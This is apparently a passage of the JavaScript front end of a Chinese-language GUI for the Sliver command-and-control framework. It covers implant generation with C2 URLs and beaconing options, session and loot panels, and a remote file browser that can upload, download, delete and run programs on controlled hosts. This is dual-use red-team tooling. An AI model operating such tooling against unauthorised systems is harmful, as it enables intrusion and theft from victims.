    const profileSel=document.getElementById('gen-profile'); profileSel.innerHTML='<option value="">自定义配置</option>'+profiles.map((p,i)=>`<option value="${i}">${esc(p.name)}</option>`).join('');
    f.httpC2Profile.innerHTML='<option value="">自动选择</option>'+httpProfiles.map(p=>`<option value="${esc(p.name)}">${esc(p.name)}</option>`).join(''); updateHTTPState();
    f.trafficEncoder.innerHTML='<option value="">不使用</option>'+encoders.map(v=>`<option value="${esc(v)}">${esc(v)}</option>`).join('');
    profileSel.addEventListener('change',()=>{const p=profiles[parseInt(profileSel.value)];f._profileConfig=p||{};if(!p)return;Object.entries({goos:p.goos,goarch:p.goarch,format:p.format,c2Url:p.c2Url,httpC2Profile:p.httpC2Profile,connectionStrategy:p.connectionStrategy,reconnectInterval:p.reconnectInterval,maxConnectionErrors:p.maxConnectionErrors}).forEach(([k,v])=>{if(v!==undefined&&v!==null&&f[k])f[k].value=v;});f.debug.checked=!!p.debug;f.beacon.checked=!!p.beacon;document.getElementById('gbeacon-opts').style.display=p.beacon?'flex':'none';if(p.interval)f.interval.value=p.interval;if(p.jitter>=0)f.jitter.value=p.jitter;if(p.trafficEncoders?.length)f.trafficEncoder.value=p.trafficEncoders[0];invalidate();});
    document.getElementById('gen-preflight').addEventListener('click',async()=>{const box=document.getElementById('gen-preflight-result');box.innerHTML='<span>正在检查依赖...</span>';const r=await App().PreflightImplant(readReq()).catch(error=>({error}));if(r.error){box.innerHTML=rpcErrorHtml(r.error,'预检失败');submit.disabled=true;return;}const issues=[...(r.errors||[]).map(v=>`<li class="err">${esc(v)}</li>`),...(r.warnings||[]).map(v=>`<li class="warn">${esc(v)}</li>`)];box.innerHTML=`<strong>${r.valid?'预检通过':'预检未通过'}</strong><ul>${(r.effectiveSummary||[]).map(v=>`<li>${esc(v)}</li>`).join('')}${issues.join('')}</ul>${r.availableBuilders?.length?`<span>可用外部 Builder：${esc(r.availableBuilders.join(', '))}</span>`:''}`;submit.disabled=!r.valid;});
    // Populate "From Listener" dropdown; auto-fill C2 URL from the first one.
    const sel = document.getElementById('gen-listener');
    const c2 = document.querySelector('#gen-form [name="c2Url"]');
    const urls = await App().ListenerC2Options().catch(() => []);
    if (sel) {
      sel.innerHTML = urls.length
        ? '<option value="">- 选择活动监听器 -</option>' + urls.map(u => `<option value="${esc(u)}">${esc(u)}</option>`).join('')
        : '<option value="">- 暂无活动监听器 -</option>';
      if (urls.length && c2 && !c2.value.trim()) { sel.value = urls[0]; c2.value = urls[0]; }
      sel.addEventListener('change', () => { if (sel.value && c2) { c2.value = sel.value; invalidate(); } });
    }
    f.addEventListener('submit', async e => {
      e.preventDefault(); const f = e.target;
      const req = readReq(); submit.disabled=true;
      document.getElementById('gen-status').style.display = 'flex';
      document.getElementById('gen-result').textContent = '';
      const generationTask = taskStore.create({
        type: 'implant-generate', title: '生成植入体',
        target: `${req.goos}/${req.goarch} · ${req.format}`,
        status: 'running', summary: 'Teamserver 正在构建植入体',
        policy: '服务端构建不提供可靠取消；失败后请复核表单并重新提交，任务记录不会保存 C2 URL。',
      });
      const r = await App().GenerateImplant(req).catch(error => ({error}));
      document.getElementById('gen-status').style.display = 'none';
      const res = document.getElementById('gen-result');
      if (r.error) {
        const info = rpcError(r.error, '生成植入体失败');
        const safeMessage = RpcErrors.safeRpcErrorMessage(r.error, '生成植入体失败');
        taskStore.update(generationTask.id, { status: info.cancelled ? 'cancelled' : 'failed', summary: safeMessage, error: safeMessage });
        res.innerHTML = rpcErrorHtml(r.error, '生成植入体失败');
        res.style.color = '';
      } else {
        taskStore.update(generationTask.id, { status: 'success', summary: `已创建构建：${r.name || r.file || '未命名构建'}` });
        res.style.color = 'var(--ok)';
        res.innerHTML = `<span>[成功] 已创建构建：${esc(r.name || r.file)}</span> <button class="btn small" style="margin-left:10px" onclick="buildRegen('${esc(r.name || r.file)}')">⬇ 保存到磁盘</button>`;
        refreshBuildsList();
        // Auto-trigger the native save dialog immediately
        buildRegen(r.name || r.file);
      }
    });
  }, 0);
}
// ── Command palette (Ctrl+K) ─────────────────────────────────────────────────
let paletteItems = [], paletteSel = 0;
document.addEventListener('keydown', e => {
  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k') { e.preventDefault(); openPalette(); }
});
function openPalette() {
  if (document.getElementById('app-shell').classList.contains('hidden')) return; // not connected
  const ov = document.getElementById('palette-overlay');
  ov.classList.remove('hidden');
  const inp = document.getElementById('palette-input');
  inp.value = ''; buildPalette('');
  setTimeout(() => inp.focus(), 20);
}
function closePalette() { document.getElementById('palette-overlay').classList.add('hidden'); }
function buildPalette(q) {
  q = q.toLowerCase();
  const panels = [
    ['sessions','会话'],['beacons','信标'],['tasks','任务中心'],['listeners','监听器'],['generate','生成植入体'],
    ['builds','构建记录'],['profiles','植入体配置'],['c2profiles','C2 配置'],['events','事件日志'],['loot','战利品'],
    ['creds','凭据'],['hosts','主机'],['iocs','IOC'],['report','报告'],['scripts','脚本'],['infrastructure','基础设施'],
    ['extensions','扩展中心'],['mcp','MCP'],['operators','操作员'],['team','团队与审计']
  ];
  const items = [];
  [...allSessions.map(s => ({ kind:'session', obj:s })), ...allBeacons.map(b => ({ kind:'beacon', obj:b }))].forEach(a => {
    const label = `${a.kind==='session'?'💻':'📡'} ${a.obj.hostname||a.obj.id.slice(0,8)} — ${a.obj.username||''}`;
    if (!q || label.toLowerCase().includes(q)) items.push({ label, action: () => { switchView('sessions'); openInteract(a.kind, a.obj); } });
  });
  panels.forEach(([view, label]) => { if (!q || view.includes(q) || label.toLowerCase().includes(q)) items.push({ label: `⚙ ${label}`, action: () => openToolbarView(view) }); });
  paletteItems = items; paletteSel = 0; renderPalette();
}
function renderPalette() {
  const el = document.getElementById('palette-results');
  if (!paletteItems.length) { el.innerHTML = '<div class="palette-empty">没有匹配项</div>'; return; }
  el.innerHTML = paletteItems.map((it,i) => `<div class="palette-item${i===paletteSel?' active':''}" data-i="${i}">${esc(it.label)}</div>`).join('');
  el.querySelectorAll('.palette-item').forEach(d => d.addEventListener('click', () => { paletteItems[parseInt(d.dataset.i)].action(); closePalette(); }));
}
document.getElementById('palette-input').addEventListener('input', function(){ buildPalette(this.value); });
document.getElementById('palette-input').addEventListener('keydown', e => {
  if (e.key === 'Escape') return closePalette();
  if (e.key === 'ArrowDown') { paletteSel = Math.min(paletteSel+1, paletteItems.length-1); renderPalette(); e.preventDefault(); }
  if (e.key === 'ArrowUp')   { paletteSel = Math.max(paletteSel-1, 0); renderPalette(); e.preventDefault(); }
  if (e.key === 'Enter' && paletteItems[paletteSel]) { paletteItems[paletteSel].action(); closePalette(); }
});
document.getElementById('palette-overlay').addEventListener('click', e => { if (e.target.id === 'palette-overlay') closePalette(); });
function switchView(v) { openToolbarView(v); }

// ── Resize handle ──────────────────────────────────────────────────────────
(function() {
  const handle = document.getElementById('resize-handle');
  const top = document.getElementById('top-panel');
  const bot = document.getElementById('bottom-panel');
  let dragging = false, startY = 0, startH = 0;
  handle.addEventListener('mousedown', e => { dragging = true; startY = e.clientY; startH = bot.offsetHeight; document.body.style.cursor = 'row-resize'; e.preventDefault(); });
  document.addEventListener('mousemove', e => { if (!dragging) return; const dy = startY - e.clientY; bot.style.height = Math.max(80, startH + dy) + 'px'; });
  document.addEventListener('mouseup', () => { if (dragging) { dragging = false; document.body.style.cursor = ''; } });
})();

// ── Auto-reconnect ─────────────────────────────────────────────────────────
function onDisconnected(reason) {
  if (reconnecting) return;
  reconnecting = true; clearInterval(pollTimer);
  document.getElementById('reconnect-overlay').classList.remove('hidden');
  document.getElementById('reconnect-status').textContent = reason ? rpcErrorMessage(reason, '连接已断开') : '连接已断开';
  startReconnect();
}
function startReconnect() {
  let n = 10;
  document.getElementById('reconnect-count').textContent = n;
  clearInterval(reconnectTimer);
  reconnectTimer = setInterval(() => { n--; document.getElementById('reconnect-count').textContent = n; if (n <= 0) attemptReconnect(); }, 1000);
}
async function attemptReconnect() {
  if (!lastConfigPath) { cancelReconnect(); return; }
  clearInterval(reconnectTimer);
  document.getElementById('reconnect-status').textContent = '正在重新连接...';
  const r = await App().Connect(lastConfigPath).catch(error => ({error}));
  if (r && r.connected) { reconnecting = false; document.getElementById('reconnect-overlay').classList.add('hidden'); wireEventStream(); refreshAgents(); pollTimer = setInterval(refreshAgents, 5000); toast('ok','已重新连接'); }
  else { document.getElementById('reconnect-status').textContent = r?.error ? rpcErrorMessage(r.error, '重新连接失败') : '重新连接失败'; startReconnect(); }
}
function cancelReconnect() { reconnecting = false; clearInterval(reconnectTimer); document.getElementById('reconnect-overlay').classList.add('hidden'); }
document.getElementById('reconnect-now-btn').addEventListener('click', attemptReconnect);
document.getElementById('reconnect-cancel-btn').addEventListener('click', async () => { cancelReconnect(); await App().Disconnect().catch(()=>{}); document.getElementById('disconnect-btn').click(); });

// Show GUI build version on the connect screen once the Wails runtime is ready.
(async function showGuiVersion() {
  let bi = null;
  try { bi = await App().AppVersion(); } catch (e) { /* runtime not ready or older backend */ }
  const el = document.getElementById('gui-version');
  if (el) {
    el.textContent = bi && bi.version ? `${bi.version} · ${bi.gitCommit}` : '';
    el.title = bi ? `Built ${bi.buildDate}` : '';
  }
  const wm = document.getElementById('panel-watermark');
  if (wm) wm.textContent = `Sliver GUI${bi && bi.version ? ' ' + bi.version : ''} · Made by Raj Kumar Mullapudi`;
})();



// ── File Browser Panel ───────────────────────────────────────────────────────
async function openFileBrowser(sessionID) {
  const dockId = `files-${sessionID}`;
  if (openTabs[dockId]) { activateTab(dockId); return; }
  openTabs[dockId] = { kind: 'dock' };
  document.getElementById('empty-interact')?.remove();

  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = dockId;
  tab.innerHTML = `<span>📁 文件：${sessionID.slice(0,6)}</span><span class="close-x" data-cid="${dockId}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(dockId); });
  document.getElementById('interact-tabs').appendChild(tab);

  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${dockId}`;
  panel.innerHTML = `<div style="display:flex;flex-direction:column;flex:1;min-height:0" id="fb-dock-${dockId}"><p style="padding:10px;color:var(--muted)">正在加载文件结构...</p></div>`;
  document.getElementById('interact-panels').appendChild(panel);
  activateTab(dockId);

  // File type icon mapping
  function fileIcon(name, isDir) {
    if (isDir) return '📁';
    const ext = (name.split('.').pop() || '').toLowerCase();
    const map = {
      exe:'⚙️', dll:'🔧', sys:'🖥️', msi:'📦', bat:'📜', cmd:'📜', ps1:'💠', psm1:'💠', psd1:'💠',
      txt:'📄', log:'📋', cfg:'⚙️', ini:'⚙️', conf:'⚙️', xml:'📰', json:'📰', yaml:'📰', yml:'📰', toml:'📰',
      html:'🌐', htm:'🌐', css:'🎨', js:'📐', ts:'📐', jsx:'📐', tsx:'📐', py:'🐍', go:'🔵', rs:'🦀', c:'©️', cpp:'©️', h:'©️', cs:'💜', java:'☕', rb:'💎', php:'🐘',
      zip:'📦', rar:'📦', '7z':'📦', tar:'📦', gz:'📦', bz2:'📦', xz:'📦',
      png:'🖼️', jpg:'🖼️', jpeg:'🖼️', gif:'🖼️', bmp:'🖼️', ico:'🖼️', svg:'🖼️', webp:'🖼️',
      mp3:'🎵', wav:'🎵', flac:'🎵', ogg:'🎵', m4a:'🎵',
      mp4:'🎬', avi:'🎬', mkv:'🎬', mov:'🎬', wmv:'🎬',
      pdf:'📕', doc:'📘', docx:'📘', xls:'📗', xlsx:'📗', ppt:'📙', pptx:'📙', csv:'📊',
      db:'🗃️', sqlite:'🗃️', sql:'🗃️', mdb:'🗃️',
      key:'🔑', pem:'🔑', crt:'🔑', cer:'🔑', pfx:'🔑',
      lnk:'🔗', url:'🔗', iso:'💿', img:'💿', vhd:'💿', vmdk:'💿',
    };
    return map[ext] || '📄';
  }

  function fileTypeLabel(name, isDir) {
    if (isDir) return '文件夹';
    const ext = (name.split('.').pop() || '').toLowerCase();
    const labels = {
      exe:'应用程序', dll:'DLL 库', sys:'系统文件', msi:'安装包', bat:'批处理脚本', cmd:'命令脚本', ps1:'PowerShell 脚本',
      txt:'文本文件', log:'日志文件', cfg:'配置文件', ini:'配置文件', xml:'XML 文件', json:'JSON 文件', yaml:'YAML 文件',
      html:'HTML 文件', py:'Python 脚本', go:'Go 源代码', rs:'Rust 源代码', c:'C 源代码', cpp:'C++ 源代码', cs:'C# 源代码',
      zip:'ZIP 压缩包', rar:'RAR 压缩包', tar:'TAR 归档', gz:'GZip 压缩包',
      png:'PNG 图像', jpg:'JPEG 图像', jpeg:'JPEG 图像', gif:'GIF 图像', bmp:'位图图像',
      pdf:'PDF 文档', doc:'Word 文档', docx:'Word 文档', xls:'Excel 工作簿', xlsx:'Excel 工作簿',
      pem:'PEM 证书', crt:'证书', key:'私钥',
    };
    return labels[ext] || (ext ? ext.toUpperCase() + ' 文件' : '未知文件');
  }

  // Path helpers
  function splitPath(p) {
    p = (p || '').replace(/\\/g, '/').replace(/\/+$/, '');
    if (!p || p === '.') return [];
    return p.split('/').filter(Boolean);
  }
  function joinPath(parts) { return parts.length ? parts.join('/') : '.'; }
  function isRootPath(path) { return path === '/' || /^[a-z]:[\\/]?$/i.test((path || '').trim()); }
  function childPath(dir, name) {
    if (!dir || dir === '.') return name;
    const separator = dir.includes('\\') && !dir.includes('/') ? '\\' : '/';
    return dir.replace(/[\\/]+$/, '') + separator + name;
  }
  function formatModTime(seconds) {
    if (!seconds) return '—';
    const date = new Date(Number(seconds) * 1000);
    return Number.isNaN(date.getTime()) ? '—' : date.toLocaleString('zh-CN', { hour12: false });
  }

  function propertyValue(value, fallback = '不可用') {
    if (value === undefined || value === null || value === '') return fallback;
    return String(value);
  }

  function filePropertiesSummary(props, hashResult) {
    const rows = [
      ['路径', props.path || ''],
      ['类型', props.type || (props.isDir ? '文件夹' : '文件')],
      ['大小', props.isDir ? '—' : fmtSize(Number(props.size || 0))],
      ['修改时间', formatModTime(props.modTime)],
      ['创建时间', formatModTime(props.createdAt)],
      ['访问时间', formatModTime(props.accessedAt)],
      ['权限/模式', propertyValue(props.mode)],
      ['所有者', propertyValue(props.owner)],
    ];
    if (hashResult?.hash) rows.push([hashResult.algorithm || 'SHA-256', hashResult.hash]);
    return rows.map(([label, value]) => `${label}: ${value}`).join('\n');
  }

  async function copyFilePropertyText(text, label = '内容') {
    try { await navigator.clipboard.writeText(text || ''); toast('ok', `${label}已复制到剪贴板`); }
    catch (error) { toastRpcError(error, '复制失败'); }
  }

  const history = [];
  let histIdx = -1;
  let currentPath = '.';
  let mounts = [];
  let mountsError = '';
  let mountsExpanded = true;

  function mountTypeLabel(type) {
    return ({ '2':'可移动设备', '3':'本地磁盘', '4':'网络驱动器', '5':'光驱', '6':'内存盘' })[String(type)] || '挂载点';
  }

  function formatDiskSize(bytes) {
    return Number(bytes) > 0 ? fmtSize(Number(bytes)) : '未知';
  }

  async function loadMounts() {
    const result = await App().FileBrowserMounts(sessionID).catch(error => ({ error }));
    mounts = result.mounts || [];
    mountsError = result.error ? rpcErrorMessage(result.error, '当前 Teamserver 不支持读取磁盘列表') : '';
  }

  function renderMounts() {
    if (!mountsExpanded) return '';
    if (mountsError) return `<div class="fb-drives fb-drives-message"><span>${esc(mountsError)}</span><button class="btn small" data-mount-refresh>重试</button></div>`;
    if (!mounts.length) return '<div class="fb-drives fb-drives-message"><span>目标未返回可用的磁盘或挂载点</span><button class="btn small" data-mount-refresh>刷新</button></div>';
    const items = mounts.map(mount => {
      const label = mount.label ? ` ${mount.label}` : '';
      const detail = [mountTypeLabel(mount.volumeType), mount.fileSystem, `可用 ${formatDiskSize(mount.freeSpace)}`].filter(Boolean).join(' · ');
      return `<button class="fb-drive" type="button" data-mount-path="${esc(mount.mountPoint)}" title="${esc(mount.volumeName || mount.mountPoint)}">
        <span class="fb-drive-icon">▰</span><span><strong>${esc(mount.mountPoint)}${esc(label)}</strong><small>${esc(detail)}</small></span>
      </button>`;
    }).join('');
    return `<div class="fb-drives"><div class="fb-drive-list">${items}</div><button class="fb-drive-refresh" type="button" data-mount-refresh title="刷新磁盘列表">刷新</button></div>`;
  }

  async function uploadToCurrentDirectory() {
    const result = await runFileTransfer('upload', sessionID, currentPath, { toDirectory: true });
    if (result?.error) {
      if (!/upload cancelled/i.test(String(result.error))) toastRpcError(result.error, '上传文件失败');
      return;
    }
    toast('ok', `文件已上传到 ${result.path}`);
    await renderDir(currentPath, false);
  }

  function showFileExecutionResult(file, result) {
    const ov = document.createElement('div');
    ov.className = 'ui-dialog-overlay';
    const stdout = result.stdout || '';
    const stderr = result.stderr || '';
    ov.innerHTML = `<div class="ui-dialog execute-file-dialog">
      <div class="ui-dialog-title">运行结果</div>
      <div class="execute-file-summary"><strong>${esc(file.name)}</strong><span>退出状态 ${Number(result.status || 0)}${result.pid ? ` · PID ${Number(result.pid)}` : ''}</span></div>
      <div class="execute-output-grid">
        <section><label>标准输出</label><pre>${esc(stdout || '（无输出）')}</pre></section>
        <section><label>标准错误</label><pre class="${stderr ? 'has-error' : ''}">${esc(stderr || '（无输出）')}</pre></section>
      </div>
      <div class="ui-dialog-actions"><button class="btn small accent" data-dialog-close>关闭</button></div>
    </div>`;
    document.body.appendChild(ov);
    const done = () => { ov.remove(); document.removeEventListener('keydown', onKey); };
    const onKey = event => { if (event.key === 'Escape' || event.key === 'Enter') done(); };
    ov.querySelector('[data-dialog-close]').addEventListener('click', done);
    ov.addEventListener('click', event => { if (event.target === ov) done(); });
    document.addEventListener('keydown', onKey);
    ov.querySelector('[data-dialog-close]').focus();
  }

  function showFileExecuteDialog(file) {
    const session = allSessions.find(item => item.id === sessionID);
    const isWindows = (session?.os || '').toLowerCase().includes('windows');
    const ov = document.createElement('div');
    ov.className = 'ui-dialog-overlay';
    ov.innerHTML = `<div class="ui-dialog execute-file-dialog">
      <div class="ui-dialog-title">运行程序</div>
      <form class="execute-file-form">
        <label><span>程序路径</span><input type="text" value="${esc(file.path).replace(/"/g, '&quot;')}" readonly/></label>
        <label><span>命令行参数</span><input name="arguments" type="text" autocomplete="off" placeholder='例如：--name "hello world" /silent'/><small>使用空格分隔参数；带空格的参数请放在引号内。</small></label>
        <div class="execute-file-options">
          <label class="check-label"><input name="background" type="checkbox"/> 后台运行</label>
          ${isWindows ? '<label class="check-label"><input name="hideWindow" type="checkbox"/> 隐藏窗口</label>' : ''}
        </div>
        <div class="execute-file-note">后台运行只确认进程已创建，不会持续收集程序输出。</div>
        <div class="execute-file-error" role="alert"></div>
        <div class="ui-dialog-actions"><button type="button" class="btn small" data-dialog-cancel>取消</button><button type="submit" class="btn small accent" data-dialog-run>运行</button></div>
      </form>
    </div>`;
    document.body.appendChild(ov);
    const form = ov.querySelector('form');
    const argsInput = form.elements.arguments;
    const errorBox = ov.querySelector('.execute-file-error');
    const runButton = ov.querySelector('[data-dialog-run]');
    let running = false;
    const close = () => {
      if (running) return;
      ov.remove();
      document.removeEventListener('keydown', onKey);
    };
    const onKey = event => { if (event.key === 'Escape') close(); };
    ov.querySelector('[data-dialog-cancel]').addEventListener('click', close);
    ov.addEventListener('click', event => { if (event.target === ov) close(); });
    document.addEventListener('keydown', onKey);
    form.addEventListener('submit', async event => {
      event.preventDefault();
      if (running) return;
      const parsed = ArgumentParser.parseArguments(argsInput.value);
      if (parsed.error) {
        errorBox.textContent = parsed.error;
        argsInput.focus();
        return;
      }
      errorBox.textContent = '';
      running = true;
      runButton.disabled = true;
      runButton.textContent = form.elements.background.checked ? '正在启动...' : '正在运行...';
      const result = await App().FileBrowserExecute(
        sessionID,
        file.path,
        parsed.args,
        form.elements.background.checked,
        Boolean(form.elements.hideWindow?.checked),
      ).catch(error => ({ error }));
      running = false;
      if (result?.error) {
        const info = rpcError(result.error, '运行程序失败');
        errorBox.textContent = info.detail ? `${info.message}：${info.detail}` : info.message;
        runButton.disabled = false;
        runButton.textContent = '运行';
        return;
      }
      ov.remove();
      document.removeEventListener('keydown', onKey);
      if (form.elements.background.checked) {
        toast('ok', `程序已在后台启动${result.pid ? `，PID ${result.pid}` : ''}`, 5000);
      } else {
        showFileExecutionResult(file, result || {});
      }
    });
    argsInput.focus();
  }

  async function showFilePropertiesDialog(file) {
    if (!file) return;
    const ov = document.createElement('div');
    ov.className = 'ui-dialog-overlay';
    ov.innerHTML = `<div class="ui-dialog file-properties-dialog">
      <div class="ui-dialog-title">属性</div>
      <div class="file-props-loading"><span class="spinner"></span>正在读取属性...</div>
    </div>`;
    document.body.appendChild(ov);
    let closed = false;
    let props = null;
    let hashResult = null;
    const close = () => { closed = true; ov.remove(); document.removeEventListener('keydown', onKey); };
    const onKey = event => { if (event.key === 'Escape') close(); };
    ov.addEventListener('click', event => { if (event.target === ov) close(); });
    document.addEventListener('keydown', onKey);

    const draw = (state = 'ready', message = '') => {
      if (closed) return;
      const hashRow = file.isDir
        ? '<div><dt>SHA-256</dt><dd>目录不支持哈希核验</dd></div>'
        : `<div><dt>SHA-256</dt><dd class="file-props-hash">${hashResult?.hash ? `<code>${esc(hashResult.hash)}</code><button class="btn small" data-props-copy-hash>复制</button>` : '未计算'}</dd></div>`;
      ov.innerHTML = `<div class="ui-dialog file-properties-dialog">
        <div class="ui-dialog-title">属性</div>
        <div class="file-props-head"><strong>${esc(file.name)}</strong><span>${esc(props?.type || (file.isDir ? '文件夹' : fileTypeLabel(file.name, false)))}</span></div>
        ${message ? `<div class="task-note ${state === 'error' ? 'error-msg' : ''}">${esc(message)}</div>` : ''}
        <dl class="file-props-grid">
          <div><dt>完整路径</dt><dd><code>${esc(props?.path || file.path)}</code></dd></div>
          <div><dt>类型</dt><dd>${esc(props?.type || (file.isDir ? '文件夹' : '文件'))}</dd></div>
          <div><dt>大小</dt><dd>${props?.isDir ? '—' : fmtSize(Number(props?.size || file.size || 0))}</dd></div>
          <div><dt>修改时间</dt><dd>${formatModTime(props?.modTime || file.modTime)}</dd></div>
          <div><dt>创建时间</dt><dd>${formatModTime(props?.createdAt)}</dd></div>
          <div><dt>访问时间</dt><dd>${formatModTime(props?.accessedAt)}</dd></div>
          <div><dt>权限/模式</dt><dd>${esc(propertyValue(props?.mode || file.mode))}</dd></div>
          <div><dt>所有者</dt><dd>${esc(propertyValue(props?.owner))}</dd></div>
          ${hashRow}
        </dl>
        <div class="task-note">属性来自 Sliver 已公开的文件列表和下载 RPC；目标或 Teamserver 未返回的字段显示为不可用。</div>
        <div class="ui-dialog-actions">
          <button type="button" class="btn small" data-props-copy-path>复制路径</button>
          <button type="button" class="btn small" data-props-copy-summary>复制摘要</button>
          ${file.isDir ? '' : `<button type="button" class="btn small" data-props-hash ${state === 'hashing' ? 'disabled' : ''}>${state === 'hashing' ? '正在计算...' : '计算哈希'}</button>`}
          <button type="button" class="btn small" data-props-refresh ${state === 'loading' ? 'disabled' : ''}>刷新</button>
          <button type="button" class="btn small accent" data-dialog-close>关闭</button>
        </div>
      </div>`;
      ov.querySelector('[data-dialog-close]')?.addEventListener('click', close);
      ov.querySelector('[data-props-copy-path]')?.addEventListener('click', () => copyFilePropertyText(props?.path || file.path, '路径'));
      ov.querySelector('[data-props-copy-summary]')?.addEventListener('click', () => copyFilePropertyText(filePropertiesSummary(props || file, hashResult), '属性摘要'));
      ov.querySelector('[data-props-copy-hash]')?.addEventListener('click', () => copyFilePropertyText(hashResult?.hash || '', '哈希'));
      ov.querySelector('[data-props-refresh]')?.addEventListener('click', loadProperties);
      ov.querySelector('[data-props-hash]')?.addEventListener('click', calculateHash);
    };

    async function loadProperties() {
      draw('loading', '正在刷新属性...');
      const result = await App().FileBrowserProperties(sessionID, file.path).catch(error => ({ error }));
      if (result?.error) {
        const info = rpcError(result.error, '读取属性失败');
        props = { ...file, type: file.isDir ? '文件夹' : '文件' };
        draw('error', info.detail ? `${info.message}：${info.detail}` : info.message);
        return;
      }
      props = result;
      draw('ready');
    }

    async function calculateHash() {
      if (file.isDir) return;
      draw('hashing', '正在下载文件并计算 SHA-256...');
      const result = await App().FileBrowserHash(sessionID, file.path).catch(error => ({ error }));
      if (result?.error) {
        const info = rpcError(result.error, '计算哈希失败');
        draw('error', info.detail ? `${info.message}：${info.detail}` : info.message);
        return;
      }
      hashResult = result;
      draw('ready', `已计算 ${esc(result.algorithm || 'SHA-256')}，读取 ${fmtSize(Number(result.bytes || 0))}`);
    }

    await loadProperties();
  }

  function showFileContextMenu(event, file) {
    event.preventDefault();
    event.stopPropagation();
    const item = (action, label, danger = false) => `<button class="ctx-item${danger ? ' danger' : ''}" data-fb-action="${action}">${label}</button>`;
    ctxMenu.innerHTML = file
      ? `<div class="ctx-agent"><strong>${esc(file.name)}</strong><span>${file.isDir ? '文件夹' : fileTypeLabel(file.name, false)}</span></div>${item('properties', '属性')}${file.isDir ? '' : item('execute', '运行程序')}${item('download', file.isDir ? '下载文件夹 (.tar.gz)' : '下载')}${item('upload', '上传到当前目录')}<div class="ctx-divider"></div>${item('delete', '删除', true)}`
      : `<div class="ctx-agent"><strong>${esc(currentPath)}</strong><span>当前目录</span></div>${item('upload', '上传文件')}`;
    ctxMenu.style.left = Math.max(8, Math.min(event.clientX, window.innerWidth - 230)) + 'px';
    ctxMenu.style.top = Math.max(8, Math.min(event.clientY, window.innerHeight - 180)) + 'px';
    ctxMenu.classList.remove('hidden');
    ctxMenu.querySelectorAll('[data-fb-action]').forEach(button => button.addEventListener('click', async clickEvent => {
      clickEvent.stopPropagation();
      ctxMenu.classList.add('hidden');
      const action = button.dataset.fbAction;
      if (action === 'upload') return uploadToCurrentDirectory();
      if (!file) return;
      if (action === 'properties') return showFilePropertiesDialog(file);
      if (action === 'execute' && !file.isDir) return showFileExecuteDialog(file);
      if (action === 'download') {
        const result = await runFileTransfer('download', sessionID, file.path);
        if (result?.error) toastRpcError(result.error, file.isDir ? '下载文件夹失败' : '下载文件失败');
        else if (result) toast('ok', `${file.isDir ? '文件夹归档' : '文件'}已保存到 ${result.path}`);
        return;
      }
      if (action === 'delete') {
        const ok = await uiConfirm(`确定删除“${file.name}”吗？${file.isDir ? ' 文件夹及其内容将被递归删除。' : ''}`, { title: file.isDir ? '删除文件夹' : '删除文件', okLabel: '删除', danger: true });
        if (!ok) return;
        const error = await App().FileBrowserDelete(sessionID, file.path).then(() => null).catch(value => value);
        if (error) return toastRpcError(error, '删除失败');
        toast('ok', `已删除：${file.name}`);
        await renderDir(currentPath, false);
      }
    }));
  }

  async function renderDir(path, addToHistory) {
    const container = document.getElementById(`fb-dock-${dockId}`);
    if (!container) return;
    const result = await App().FileBrowserList(sessionID, path).catch(error => ({ error }));
    if (result.error) { toastRpcError(result.error, '读取目录失败'); container.innerHTML = rpcErrorHtml(result.error, '读取目录失败'); return; }
    currentPath = result.path || path;

    if (addToHistory !== false) {
      histIdx++;
      history.length = histIdx;
      history.push(currentPath);
    }

    const parts = splitPath(currentPath);
    let crumbs = '';
    for (let i = 0; i < parts.length; i++) {
      let partial = joinPath(parts.slice(0, i + 1));
      if (i === 0 && /^[a-z]:$/i.test(partial)) partial += '/';
      crumbs += `<span class="fb-crumb" data-nav="${esc(partial)}">${esc(parts[i])}</span>`;
      if (i < parts.length - 1) crumbs += '<span class="fb-sep">›</span>';
    }

    const sorted = (result.files || []).slice().sort((a, b) => {
      if (a.isDir !== b.isDir) return a.isDir ? -1 : 1;
      return (a.name || '').localeCompare(b.name || '');
    });
    const dirCount = sorted.filter(f => f.isDir).length;
    const fileCount = sorted.length - dirCount;

    let html = `<div class="file-browser">
      <div class="fb-toolbar">
        <button class="fb-nav-btn" id="fb-back-${dockId}" title="后退"${histIdx <= 0 ? ' disabled' : ''}>◀</button>
        <button class="fb-nav-btn" id="fb-fwd-${dockId}" title="前进"${histIdx >= history.length - 1 ? ' disabled' : ''}>▶</button>
        <button class="fb-nav-btn" id="fb-up-${dockId}" title="上一级"${isRootPath(currentPath) ? ' disabled' : ''}>⬆</button>
        <button class="fb-nav-btn" id="fb-refresh-${dockId}" title="刷新">🔄</button>
        <button class="fb-mount-btn${mountsExpanded ? ' active' : ''}" id="fb-mounts-${dockId}" type="button" title="显示磁盘和挂载点">磁盘</button>
        <div class="fb-addressbar">${crumbs || '<span class="fb-crumb" style="color:var(--muted)">.</span>'}</div>
        <button class="fb-nav-btn fb-upload-btn" id="fb-upload-${dockId}" title="上传文件到当前目录">⬆</button>
      </div>
      ${renderMounts()}
      <div class="fb-body">
        <div class="fb-col-header">
          <span></span><span>名称</span><span style="text-align:right">大小</span><span>修改时间</span><span>权限</span>
        </div>
        <div class="fb-list" id="fb-list-${dockId}">`;

    sorted.forEach(f => {
      const cls = f.isDir ? 'fb-item dir' : 'fb-item';
      const icon = fileIcon(f.name, f.isDir);
      const size = f.isDir ? '—' : fmtSize(f.size);
      html += `<div class="${cls}" data-path="${esc(childPath(currentPath, f.name))}" data-name="${esc(f.name)}" data-dir="${f.isDir}" data-size="${f.size||0}" data-mode="${esc(f.mode||'')}" data-mod-time="${f.modTime||0}">
        <span class="fb-icon">${icon}</span>
        <span class="fb-name">${esc(f.name)}</span>
        <span class="fb-size">${size}</span>
        <span class="fb-date">${formatModTime(f.modTime)}</span>
        <span class="fb-mode">${esc(f.mode || '—')}</span>
      </div>`;
    });

    html += `</div></div>
      <div class="fb-status">
        <span>${sorted.length} 项</span>
        <span>${dirCount} 个文件夹，${fileCount} 个文件</span>
      </div>
    </div>`;
    container.innerHTML = html;

    // Wire navigation
    container.querySelector(`#fb-back-${dockId}`)?.addEventListener('click', () => { if (histIdx > 0) { histIdx--; renderDir(history[histIdx], false); } });
    container.querySelector(`#fb-fwd-${dockId}`)?.addEventListener('click', () => { if (histIdx < history.length - 1) { histIdx++; renderDir(history[histIdx], false); } });
